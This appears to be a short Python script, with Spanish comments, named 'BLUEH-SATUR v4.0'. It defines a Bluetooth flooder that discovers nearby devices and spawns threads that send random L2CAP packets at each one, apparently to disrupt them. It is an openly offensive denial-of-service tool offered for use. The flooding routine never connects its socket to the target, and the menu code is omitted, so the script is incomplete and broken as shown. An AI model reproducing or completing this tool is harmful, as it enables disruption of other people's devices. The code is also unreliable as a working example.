#!/usr/bin/env python3
import bluetooth, socket, struct, time, random, threading, sys, os
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()

class BluetoothFlooder:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats = {'packets_sent': 0, 'devices_found': 0, 'errors': 0, 'start_time': time.time()}
        self.targets = []
        
    def discover_devices(self, duration=8):
        try:
            devices = bluetooth.discover_devices(duration=duration, lookup_names=True, flush_cache=True)
            self.targets = [{'mac': addr, 'name': name if name else 'Desconocido'} for addr, name in devices]
            return devices
        except: return []
    
    def flood_device(self, target_mac):
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        while self.running:
            try:
                packet = os.urandom(random.randint(50, 200))
                sock.send(packet)
                self.stats['packets_sent'] += 1
            except:
                self.stats['errors'] += 1
                time.sleep(0.01)

    def start_flood(self, count):
        self.running = True
        for target in self.targets[:count]:
            t = threading.Thread(target=self.flood_device, args=(target['mac'],))
            t.daemon = True
            t.start()

# [El resto de tu código de menú y visualización que ya tienes]
# Para no alargar el comando, aquí iría tu lógica principal del menú.
print("BLUEH-SATUR v4.0 Cargado con éxito.")
